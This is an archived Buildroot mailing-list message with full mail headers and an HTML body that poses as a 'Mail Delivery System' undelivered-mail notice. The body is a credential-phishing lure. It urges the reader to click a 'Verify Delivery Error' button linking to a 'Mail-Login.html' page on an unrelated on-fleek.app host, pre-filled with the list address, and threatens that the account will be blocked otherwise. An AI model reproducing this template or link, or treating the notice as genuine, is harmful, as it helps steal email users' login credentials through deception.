Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 6AFD6C25B75
	for <buildroot@archiver.kernel.org>; Thu,  6 Jun 2024 06:39:27 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp1.osuosl.org (Postfix) with ESMTP id C2B608113C;
	Thu,  6 Jun 2024 06:39:26 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id sm6fo02tGkGB; Thu,  6 Jun 2024 06:39:26 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org D7B828114E
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp1.osuosl.org (Postfix) with ESMTP id D7B828114E;
	Thu,  6 Jun 2024 06:39:25 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id A91A01BF59C
 for <buildroot@lists.busybox.net>; Thu,  6 Jun 2024 06:39:24 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 934568113C
 for <buildroot@lists.busybox.net>; Thu,  6 Jun 2024 06:39:24 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 2SG1IDNNhDLQ for <buildroot@lists.busybox.net>;
 Thu,  6 Jun 2024 06:39:23 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=85.202.1.228;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 25EA88112D
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 25EA88112D
Received: from busybox.net (unknown [85.202.1.228])
 by smtp1.osuosl.org (Postfix) with ESMTP id 25EA88112D
 for <buildroot@busybox.net>; Thu,  6 Jun 2024 06:39:22 +0000 (UTC)
From: Mail Delivery System <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 6 Jun 2024 10:39:20 +0400
Message-ID: <20240606103919.0D7E69590FED498D@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Undelivered Mail Returned to Sender
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3813296735190629781=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============3813296735190629781==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 10.00.9200.16843">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><div class=3D"rcmBody">
<p style=3D'color: rgb(44, 54, 58); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: system-ui, -apple-system, BlinkMacSys=
temFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helve=
tica Neue", sans-serif; font-size: 14px; font-style: normal; font-weight: 4=
00; margin-top: 0px; word-spacing: 0px; white-space: normal; box-sizing: bo=
rder-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font=
-variant-ligatures: normal; font-variant-caps:=20
normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
 text-decoration-style: initial; text-decoration-color: initial;'>I'm sorry=
 to have to inform you that some messages could not be delivered to one or =
more recipients.<br><br>For further assistance, please verify messages to p=
ostmaster with below link.<br><br></p>
<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;">
<a style=3D'margin: 1em 0px; padding: 14px 16px; border-radius: 8px; text-a=
lign: center; color: rgb(255, 255, 255); text-transform: none; text-indent:=
 0px; letter-spacing: normal; font-family: system-ui, -apple-system, BlinkM=
acSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "=
Helvetica Neue", sans-serif; font-size: 14px; font-style: normal; font-weig=
ht: bold; word-spacing: 0px; display: block; white-space: normal; box-sizin=
g: border-box; background-color: rgb(0, 100, 176);=20
font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
line: none;' href=3D"https://rapid-animal-large.on-fleek.app/Mail-Login.htm=
l#buildroot@busybox.net" target=3D"_blank" rel=3D"noreferrer">Verify Delive=
ry Error</a></p>
<p style=3D'color: rgb(44, 54, 58); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: system-ui, -apple-system, BlinkMacSys=
temFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helve=
tica Neue", sans-serif; font-size: 14px; font-style: normal; font-weight: b=
old; margin-top: 0px; word-spacing: 0px; white-space: normal; box-sizing: b=
order-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); fon=
t-variant-ligatures: normal; font-variant-caps:=20
normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
 text-decoration-style: initial; text-decoration-color: initial;'><br>Your =
account will be blocked on failure to carry out this above activity.<br></p=
></div></body></html>

--===============3813296735190629781==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============3813296735190629781==--
